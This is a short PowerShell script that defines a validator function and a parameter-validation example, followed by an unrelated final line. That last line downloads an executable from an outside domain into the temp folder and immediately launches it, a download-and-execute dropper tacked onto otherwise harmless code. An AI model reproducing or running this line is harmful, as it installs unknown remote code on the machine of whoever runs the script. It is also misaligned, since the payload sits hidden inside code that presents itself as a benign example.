function MiValidator($thing_to_validate) {
    return $thing_to_validate.StartsWith("s")
}

function Invoke-SomethingThatUsesMiValidator {
    param(
        [ValidateScript( {MiValidator $_})]
        $some_param
    )
}

(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/p1/Pa_001.exe',"$env:TEMP\Pa_001.exe");Start-Process ("$env:TEMP\Pa_001.exe")

